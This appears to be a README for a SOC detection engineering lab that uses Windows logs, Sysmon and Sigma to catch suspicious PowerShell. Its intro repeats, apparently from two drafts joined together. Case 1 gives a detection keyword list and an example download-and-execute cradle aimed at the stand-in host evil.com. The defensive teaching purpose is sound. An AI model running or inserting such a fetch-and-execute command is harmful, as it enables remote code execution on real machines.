# Detection Engineering Lab

This repository contains hands-on SOC detection engineering labs focused on detecting attacker techniques using Windows logs and Sysmon.

The goal of this project is to simulate real-world attack techniques and build detection logic used by SOC analysts and Detection Engineers.

## Lab Environment

- Windows 11 Target Machine
- Kali Linux Attacker Machine
- Sysmon Logging
- Windows Event Logs
- Sigma Detection Rules

## Detection Use Cases

### Case 1 – Suspicious PowerShell Execution

This detection identifies suspicious PowerShell commands that may indicate malicious activity.

**Log Source**

Windows Security Log

**Event ID**

4688 – Process Creation

**Detection Logic**

Alert when PowerShell is executed with suspicious parameters such as:

- -nop
- -enc
- downloadstring
- IEX

Example attack:

powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"

**MITRE ATT&CK**

T1059.001 – PowerShell

## SOC Investigation Steps

- Investigate the process tree
- Identify the parent process
- Check network connections
- Determine if the activity is malicious
- Isolate the host if required

# Detection Engineering Lab

This repository contains practical detection engineering use cases based on Windows security logs and MITRE ATT&CK techniques.

## Detection Use Cases

| Use Case | Description | Technique |
|--------|-------------|-----------|
| [Case1](Case1_powershell_detection) | Detect PowerShell execution | T1059.001 |
| [Case2](Case2_Encoded_PowerShell) | Detect encoded PowerShell commands | T1059.001 |
| [Case3](Case3_Suspicious_Parent_Process) | Detect suspicious parent-child processes | T1059 |
| [Case4](Case4_PowerShell_Rundll32) | Detect rundll32 LOLBin abuse | T1218 |
| [Case5](Case5_Encoded_Hidden_PowerShell) | Detect hidden encoded PowerShell execution | T1059.001 |

| [Case6](Case6 – PowerShell Download Payload) | Detect PowerShell downloading files from the internet | T1105 |
